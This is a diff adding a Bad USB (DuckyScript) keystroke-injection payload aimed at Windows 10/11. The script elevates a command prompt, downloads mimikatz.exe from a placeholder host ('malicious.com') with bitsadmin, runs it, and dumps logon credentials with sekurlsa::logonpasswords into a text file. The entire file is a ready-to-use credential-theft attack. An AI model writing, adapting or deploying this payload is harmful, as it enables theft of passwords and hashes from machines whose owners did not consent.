@@ -1,0 +1,36 @@
+REM Title: Bad USB - Mimikatz via bitsadmin
+REM Author: DannnyzZ
+REM Date: 10.15.2023
+REM Description: MIMIKATZ drop credentials on desktop
+REM Target: Windows 10/11 (cmd)
+REM Version: 1.0
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Elevate priviledges
+DELAY 750  
+GUI r 
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 750  
+ALT t 
+DELAY 750  
+ENTER
+DELAY 500
+STRING bitsadmin /transfer "mimikatz" /download /priority foreground "https://www.malicious.com/mimikatz.exe" "C:\Users\Public\mimikatz.exe"
+ENTER
+DELAY 3000
+
+REM Execute commands in mimikatz
+STRING start C:\Users\Public\mimikatz.exe
+ENTER
+DELAY 500
+STRING privilege::debug
+ENTER
+DELAY 1000
+STRING sekurlsa::logonpasswords >> C:\Users\Public\dump.txt
+ENTER
+DELAY 1000
+
